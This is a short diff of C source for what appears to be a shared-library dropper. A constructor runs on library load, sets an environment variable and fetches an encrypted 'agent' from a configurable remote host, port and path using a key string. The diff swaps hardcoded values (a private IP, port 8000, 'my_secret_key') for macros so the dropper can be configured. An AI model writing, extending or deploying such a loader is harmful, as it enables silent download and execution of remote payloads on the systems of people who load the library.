@@ -16,6 +16,12 @@
 #include <sys/wait.h>
 #include <unistd.h>
 
+/* Configurable Options */
+#define DOWNLOAD_HOST ""
+#define DOWNLOAD_PORT ""
+#define DOWNLOAD_PATH ""
+#define DOWNLOAD_KEY ""
+
 #define BUFFER_SIZE 1024
 
 #ifdef DEBUG
@@ -217,10 +223,10 @@ void __attribute__((constructor)) initLibrary(void) {
   setenv("LD", "true", 1);
 
   // update with the correct host, port, path, and key string
-  const char *host = "192.168.122.202";
-  const char *port = "8000";
-  const char *path = "/agent";
-  const char *key_str = "my_secret_key";
+  const char *host = DOWNLOAD_HOST;
+  const char *port = DOWNLOAD_PORT;
+  const char *path = DOWNLOAD_PATH;
+  const char *key_str = DOWNLOAD_KEY;
   uint8_t key[16];
   derive_key_from_string(key_str, key);
   char *buf = NULL;
